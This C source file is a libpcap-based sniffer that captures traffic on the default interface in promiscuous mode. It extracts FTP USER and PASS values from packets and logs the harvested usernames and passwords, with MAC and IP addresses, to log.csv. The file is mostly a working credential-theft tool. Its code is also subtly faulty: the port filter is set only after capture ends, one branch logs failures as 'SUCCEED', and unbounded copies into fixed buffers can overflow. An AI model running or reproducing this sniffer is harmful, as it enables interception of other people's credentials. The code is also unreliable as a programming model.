#include <arpa/inet.h>     /* define inet_ntoa() */
#include <ctype.h>         /* use inprint() */
#include <linux/tcp.h>     /* define struct tcphdr */
#include <net/ethernet.h>  /* define struct ether_header & struct ether_addr */
#include <netinet/ether.h> /* define ether_ntoa() */
#include <netinet/ip.h>    /* define struct iphdr & struct in_addr */
#include <pcap/pcap.h>     /* libpcap */
#include <string.h>        /* mem*() and str*()) */
#include <termios.h>       /* use struct termios */
#include <time.h>          /* use struct tm & strftime() */

struct termios init; /* initial terminal i/o attributes */
void nblock();       /* set non-blocking keyboard input */
void restore();      /* restore terminal keyboard attributes */

pcap_t *handle;            /* network interface handle */
struct timeval ts;         /* packet time stamp in struct timeval */
struct ether_header *ehdr; /* ethernet packet header */
struct iphdr *ihdr;        /* ip packet header */
struct tcphdr *thdr;       /* tcp packet header */

FILE *fp; /* log file output */

char smac[18];   /* source mac address in ASCII */
char dmac[18];   /* destination mac address in ASCII */
char sip[16];    /* source ip address in ASCII */
char dip[16];    /* destination ip address in ASCII */
char tm_fmt[20]; /* packet time stamp in ASCII */

char username[16];  /* ftp username */
char password[129]; /* ftp password */

/* memory search */
extern void *memmem(const void *, size_t, const void *, size_t);
/* handle packet */
void logger(unsigned char *, const struct pcap_pkthdr *, const unsigned char *);

int main(int argc, char **argv) {
  nblock();
  char errbuf[PCAP_ERRBUF_SIZE];

  /* find a network interface */
  char *dev = pcap_lookupdev(errbuf);
  /* open device */
  handle = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf);
  printf("Opening device[%s] for capture, press 'q' to quit.\n\n", dev);

  /* open log file for writing */
  fp = fopen("log.csv", "a");

  /* capture packets */
  pcap_loop(handle, 0, logger, NULL);

  /* capture only tcp 53 */
  struct bpf_program filter;
  pcap_compile(handle, &filter, "tcp port 21", 0, 0);
  pcap_setfilter(handle, &filter);

  /* closing device */
  pcap_close(handle);
  printf("\nDevice[%s] closed.\n", dev);
  restore();
  return 0;
}

/* handle packet */
void logger(unsigned char *user, const struct pcap_pkthdr *pkthdr,
            const unsigned char *packet) {
  ehdr = (struct ether_header *)packet;
  ihdr = (struct iphdr *)((unsigned char *)ehdr + sizeof(*ehdr));
  thdr = (struct tcphdr *)((unsigned char *)ihdr + sizeof(*ihdr));

  /* get packet time stamp in ASCII */
  strftime(tm_fmt, sizeof tm_fmt, "%Y-%m-%d %H:%M:%S",
           localtime(&pkthdr->ts.tv_sec));
  /* get ethernet mac address in ASCII */
  strcpy(smac, ether_ntoa((struct ether_addr *)ehdr->ether_shost));
  strcpy(dmac, ether_ntoa((struct ether_addr *)ehdr->ether_dhost));
  /* get ip address in ASCII */
  strcpy(sip, inet_ntoa((struct in_addr){ihdr->saddr}));
  strcpy(dip, inet_ntoa((struct in_addr){ihdr->daddr}));

  /* get tcp datagram start and size(imprecise) */
  void *datagram = (unsigned char *)thdr + sizeof(*thdr);
  uint16_t dg_len = ihdr->tot_len - sizeof(*ihdr) - sizeof(*ehdr);

  char *r;
  int i;
  if ((r = memmem(datagram, dg_len, "USER ", 5)) != NULL) {
    for (i = 0; isprint(r[5 + i]); ++i) username[i] = r[5 + i];
    username[i] = 0;
  }
  if ((r = memmem(datagram, dg_len, "PASS ", 5)) != NULL) {
    for (i = 0; isprint(r[5 + i]); ++i) password[i] = r[5 + i];
    password[i] = 0;
  }
  if (memmem(datagram, dg_len, "230", 3) != NULL) {
    printf("%s,%s,%s,%s,%s,%s,%s,SUCCEED\n", tm_fmt, smac, sip, dmac, dip,
           username, password);
    fprintf(fp,"%s,%s,%s,%s,%s,%s,%s,SUCCEED\n", tm_fmt, smac, sip, dmac, dip,
           username, password);
  }
  if (memmem(datagram, dg_len, "530", 3) != NULL) {
    printf("%s,%s,%s,%s,%s,%s,%s,FAILED\n", tm_fmt, smac, sip, dmac, dip,
           username, password);
    fprintf(fp,"%s,%s,%s,%s,%s,%s,%s,SUCCEED\n", tm_fmt, smac, sip, dmac, dip,
           username, password);
  }

  /* quit on pressing q */
  if (getchar() == 'q') pcap_breakloop(handle);
}

/* set non-blocking keyboard input */
void nblock() {
  tcgetattr(0, &init);
  struct termios attr = init;
  attr.c_lflag &= ~ICANON;
  attr.c_lflag &= ~ECHO;
  attr.c_lflag &= ~ISIG;
  attr.c_cc[VMIN] = 0;
  attr.c_cc[VTIME] = 0;
  tcsetattr(0, TCSANOW, &attr);
}

/* restore terminal keyboard attributes */
void restore() { tcsetattr(0, TCSANOW, &init); }